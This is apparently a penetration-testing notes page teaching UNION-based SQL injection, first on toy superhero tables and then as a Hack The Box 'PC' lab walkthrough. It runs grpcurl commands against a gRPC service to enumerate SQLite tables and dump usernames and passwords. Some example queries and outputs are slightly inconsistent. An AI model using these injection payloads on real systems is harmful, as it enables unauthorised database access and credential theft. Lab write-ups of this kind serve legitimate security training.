---
description: The Union clause is used to combine results from multiple SELECT statements.
---

# Union SQL injection

### What is a Union SQL injection?

Using the union clause we can combine results of multiple statements and so get the data from the entire database.

```
mysql> SELECT * FROM superheroes;
+----------+-----------+
| code     | name      |
+----------+-----------+
| 54       | Superman  |
| 55       | Spiderman |
| 56       | Iron Man  |
+----------+-----------+
```

Our select statement above extracts all data from the table superheroes. Now lets check what the table villains will return.

```
mysql> SELECT * FROM villains;
+----------+-----------+
| Arrests  | name      |
+----------+-----------+
| 150      | Joker     |
+----------+-----------+
```

Now if we use UNION SELECT it will combine the results

```
mysql> SELECT * FROM superheroes;
+----------+-----------+
| code     | name      |
+----------+-----------+
| 54       | Superman  |
| 55       | Spiderman |
| 150      | Joker     |
| 56       | Iron Man  |
+----------+-----------+
```

{% hint style="info" %}
A `UNION` statement can only operate on `SELECT` statements with an equal number of columns.
{% endhint %}

An example where an injection is possible in the query

```sql
SELECT * FROM products WHERE product_id = 'user_input'
```

In `'user_input'` we can inject `'1' UNION SELECT username, password from passwords-- '` to return usernames and passwords.

```sql
SELECT * from products where product_id = '1' UNION SELECT username, password from passwords-- '
```

### Un-even columns

Union clause only work with even columns. If we come across un-even columns we can put junk data in the remaining columns to even it out, like `SELECT 1 from passwords`.

If we had 2 colums

```sql
'1' UNION SELECT username, 2 from passwords
```

If we had 4 columns

```sql
'1' UNION SELECT username, 2, 3, 4 from passwords-- '

# this would return
mysql> SELECT * from products where product_id UNION SELECT username, 2, 3, 4 from passwords-- '

+-----------+-----------+-----------+-----------+
| product_1 | product_2 | product_3 | product_4 |
+-----------+-----------+-----------+-----------+
|   admin   |    2      |    3      |    4      |
+-----------+-----------+-----------+-----------+
```

## SQL injection

This vulnerbality can be found in [https://www.hackthebox.com/machines/pc](https://www.hackthebox.com/machines/pc)

Using [gRPC](grpc.md) we found an sqlite3 injection vulnerability in id parameter by combining the id 542 with sqlite version with the payload `'id: "542 union select sqlite_version();"'`.

{% code overflow="wrap" %}
```bash
$ sudo docker run fullstorydev/grpcurl -d 'id: "542 union select sqlite_version();"' -H "token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoibWN6ZW4iLCJleHAiOjE3MzA5OTk3MTN9.DQC0fqjcY92Yj4bQ_RWTq3XwlCmmsCGwpWJLUjimm6I" -plaintext -format text 10.10.11.214:50051 SimpleApp.getInfo      
message: "3.31.1"
```
{% endcode %}

{% hint style="info" %}
Be sure the quotes and other special chars dont break the command.
{% endhint %}

Since this is using sqllite 3 we are using sqllite 3 [payloads](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md#string-based---extract-database-structure).

<figure><img src="broken-reference" alt=""><figcaption></figcaption></figure>

Extracting table name

The next step is to extract the table names using the payload

{% hint style="info" %}
`SELECT group_concat(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'`
{% endhint %}

```bash
$ sudo docker run fullstorydev/grpcurl -d 'id: "453 Union SELECT group_concat(tbl_name) FROM sqlite_master WHERE type=\"table\" and tbl_name NOT like \"sqlite_%\""' -H "token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoibWN6ZW4iLCJleHAiOjE3MzA5OTk3MTN9.DQC0fqjcY92Yj4bQ_RWTq3XwlCmmsCGwpWJLUjimm6I" -plaintext -format text 10.10.11.214:50051 SimpleApp.getInfo
message: "accounts,messages"
```

This returns the tables accounts and messages. Using the colums payload . We get back accounts, username, password in the table.

{% hint style="info" %}
SELECT sql FROM sqlite\_master WHERE type!='meta' AND sql NOT NULL AND name ='table\_name'
{% endhint %}

```bash
$ sudo docker run fullstorydev/grpcurl -d 'id: "453 Union SELECT sql FROM sqlite_master WHERE type!=\"meta\" AND sql NOT NULL AND name =\"accounts\""' -H "token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoibWN6ZW4iLCJleHAiOjE3MzA5OTk3MTN9.DQC0fqjcY92Yj4bQ_RWTq3XwlCmmsCGwpWJLUjimm6I" -plaintext -format text 10.10.11.214:50051 SimpleApp.getInfo
message: "CREATE TABLE \"accounts\" (\n\tusername TEXT UNIQUE,\n\tpassword TEXT\n)"
```

The next step is to retrieve password using the payload.

{% hint style="info" %}
`320 union select group_concat(username || ":" || password ) from accounts`
{% endhint %}

* `group_concat` will concatenate values from multiple rows into a single string
* `username || ":" || password` will concatenate columns with username password seperated by colon :.

```bash
$ sudo docker run fullstorydev/grpcurl -d 'id: "320 union select group_concat(username || \":\" || password ) from accounts"' -H "token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoibWN6ZW4iLCJleHAiOjE3MzA5OTk3MTN9.DQC0fqjcY92Yj4bQ_RWTq3XwlCmmsCGwpWJLUjimm6I" -plaintext -format text 10.10.11.214:50051 SimpleApp.getInfo
message: "admin:admin,sau:HereIsYourPassWord1431"
```
